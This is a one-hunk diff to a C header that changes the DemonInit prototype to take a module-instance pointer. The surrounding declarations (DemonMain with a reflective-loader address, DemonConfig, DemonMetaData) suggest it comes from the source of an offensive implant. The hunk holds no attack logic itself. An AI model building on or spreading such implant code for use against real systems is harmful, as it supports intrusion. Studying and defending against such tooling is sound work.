@@ -506,7 +506,7 @@ extern INSTANCE Instance;
 
 VOID DemonMain( PVOID ModuleInst, PVOID ReflectiveLdrAddr );
 VOID DemonRoutine( );
-VOID DemonInit( VOID );
+VOID DemonInit( PVOID ModuleInst );
 VOID DemonMetaData( PPACKAGE* Package, BOOL Header );
 VOID DemonConfig();
 
